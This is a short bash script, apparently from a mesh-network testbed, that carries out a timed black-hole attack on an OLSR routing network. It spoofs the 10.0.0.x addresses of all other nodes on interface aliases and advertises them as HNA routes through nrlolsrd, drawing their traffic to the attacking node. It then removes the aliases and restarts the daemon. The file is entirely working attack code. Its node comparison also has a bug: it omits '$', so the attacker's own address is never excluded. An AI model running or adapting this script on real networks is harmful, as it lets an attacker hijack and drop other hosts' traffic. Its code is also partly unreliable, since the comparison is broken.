#!/bin/bash
startTime=$1
pendingDuration=$2
attackingNode=$3
numberOfNodes=$4

bringDownInterfaces()
{
sleep $pendingDuration
for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		if [ $nodeToSpoof != attackingNode ]
			then
				ifconfig "eth0:$nodeToSpoof" down
				echo ifconfig "eth0:$nodeToSpoof" down
		fi
	done
}

runOLSRAttack()
{
	killall nrlolsrd
	nrlolsrd -i eth0 -hna tmp.txt &
	sleep $pendingDuration
	stopOLSRAttack
}

stopOLSRAttack()
{
	killall nrlolsrd
	rm tmp.txt
	bringDownInterfaces
	nrlolsrd -i eth0 &
}


bringUpInterfaces()
{
	for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		
		if [ $nodeToSpoof != attackingNode ]
			then
				ipToSpoof="10.0.0.$nodeToSpoof"
				ifconfig eth0:$nodeToSpoof $ipToSpoof netmask 255.255.255.255 up
				echo "HNA $ipToSpoof 32" >> tmp.txt
		fi
	done	
}

rm tmp.txt
echo "none" > /tmp/attack.txt
sleep $startTime

if [ $pendingDuration -gt 0 ]
	then
		echo "blackHole" > /tmp/attack.txt

		if [ `ps -ef | grep nrlolsrd | wc -l` -gt 1 ]
			then
				bringUpInterfaces
				runOLSRAttack
			else
				bringDownInterfaces
		fi
fi
echo "none" > /tmp/attack.txt




